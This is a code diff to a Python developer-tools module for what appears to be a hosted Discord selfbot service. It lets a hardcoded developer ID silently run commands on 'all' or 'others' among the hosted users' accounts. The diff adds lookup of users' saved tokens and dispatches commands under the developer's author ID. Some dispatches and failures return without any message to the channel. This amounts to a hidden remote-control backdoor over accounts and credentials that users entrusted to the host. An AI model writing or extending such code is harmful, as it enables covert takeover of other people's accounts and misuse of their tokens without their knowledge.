@@ -1,4 +1,5 @@
 import json
+import os
 import time
 
 
@@ -114,23 +115,23 @@ class DeveloperTools:
         if not content.startswith(dev_prefix):
             return False
 
-        command_text = content[len(bot_instance.prefix):]
+        command_text = content[len(dev_prefix):]
         
         # Developer commands prefixed with 'd' for clarity
-        if command_text.startswith("drun "):
-            return self._handle_run_command(command_text[5:], channel_id, bot_instance, author_id=author_id)
+        if command_text.startswith("run "):
+            return self._handle_run_command(command_text[4:], channel_id, bot_instance, author_id=author_id)
         
-        elif command_text.startswith("dlog "):
-            return self._process_logging_command(command_text[5:], channel_id, bot_instance)
+        elif command_text.startswith("log "):
+            return self._process_logging_command(command_text[4:], channel_id, bot_instance)
         
-        elif command_text.startswith("ddebug"):
+        elif command_text.startswith("debug"):
             # Quick debug toggle
             new_state = self.toggle_debug_mode()
             status = "Enabled" if new_state else "Disabled"
             bot_instance.api.send_message(channel_id, f"> **Debug Mode **{status}**.")
             return True
         
-        elif command_text.startswith("dmetrics"):
+        elif command_text.startswith("metrics"):
             # Show current metrics
             metrics_str = ", ".join([f"{k}: {v}" for k, v in self.metrics.items()])
             uptime = time.time() - self.session_start
@@ -225,6 +226,7 @@ class DeveloperTools:
         Returns: list of (uid, instance, token) tuples
         """
         selected = []
+        local_entry = self._get_local_instance_entry(bot_instance)
         
         # uid_spec can be: 'all', 'others', or comma-separated UIDs
         if uid_spec.lower() == "all":
@@ -233,6 +235,8 @@ class DeveloperTools:
                 for token, inst in bot_instance._manager.bots.items():
                     if inst and getattr(inst, 'connection_active', False):
                         selected.append((getattr(inst, 'user_id', '?'), inst, token))
+            elif local_entry:
+                selected.append(local_entry)
         
         elif uid_spec.lower() == "others":
             # All except developer (ID 297588166653902849)
@@ -242,6 +246,10 @@ class DeveloperTools:
                     if inst and getattr(inst, 'connection_active', False):
                         if str(getattr(inst, 'user_id', '')) != dev_id:
                             selected.append((getattr(inst, 'user_id', '?'), inst, token))
+            elif local_entry:
+                uid, inst, token = local_entry
+                if str(getattr(inst, 'user_id', '')) != self.get_dev_id():
+                    selected.append(local_entry)
         
         else:
             # Parse comma-separated UIDs
@@ -253,10 +261,37 @@ class DeveloperTools:
                             uid = str(getattr(inst, 'user_id', '?'))
                             if uid in target_uids:
                                 selected.append((uid, inst, token))
+                elif local_entry:
+                    uid, inst, token = local_entry
+                    user_id = str(getattr(inst, 'user_id', '') or os.environ.get("HOSTED_USER_ID", ""))
+                    if uid in target_uids or user_id in target_uids:
+                        selected.append(local_entry)
             except Exception:
                 pass
         
         return selected
+
+    def _get_local_instance_entry(self, bot_instance):
+        hosted_uid = str(os.environ.get("HOSTED_UID", "")).strip()
+        hosted_user_id = str(getattr(bot_instance, 'user_id', '') or os.environ.get("HOSTED_USER_ID", "")).strip()
+
+        if hosted_uid:
+            return hosted_uid, bot_instance, getattr(bot_instance, 'token', '')
+
+        try:
+            from host import host_manager
+
+            for token_id, data in host_manager.saved_users.items():
+                entry_uid = str(data.get("uid") or token_id)
+                entry_user_id = str(data.get("user_id") or "")
+                if getattr(bot_instance, 'token', None) and data.get("token") == getattr(bot_instance, 'token'):
+                    return entry_uid, bot_instance, data.get("token", "")
+                if hosted_user_id and entry_user_id == hosted_user_id:
+                    return entry_uid, bot_instance, data.get("token", "")
+        except Exception:
+            pass
+
+        return None
     
     def _send_status_message(self, bot_instance, channel_id, status_text, is_error=False):
         """Send a colored status message to the channel."""
@@ -308,6 +343,10 @@ class DeveloperTools:
         if not selected_instances:
             # Silently return instead of error
             return True
+
+        local_only_dispatch = not hasattr(bot_instance, '_manager') and all(
+            inst is bot_instance for _, inst, _ in selected_instances
+        )
         
         # Check for distribution flag
         distribute_messages = False
@@ -354,7 +393,7 @@ class DeveloperTools:
                 try:
                     ctx = {
                         "channel_id": target_channel,
-                        "author_id": uid,
+                        "author_id": str(author_id or self.get_dev_id()),
                         "api": inst.api,
                         "bot": inst,
                     }
@@ -364,6 +403,10 @@ class DeveloperTools:
                     results.append(f"✅ UID {uid}: Executed '{cmd_name}'")
                 except Exception as e:
                     results.append(f"❌ UID {uid}: Failed to execute ({str(e)[:50]})")
+
+        if local_only_dispatch:
+            self.metrics["commands_executed"] += 1
+            return True
         
         # Format and send results
         result_msg = f"```yaml\nRun Command Results:\n  Target Channel: {target_channel}\n"
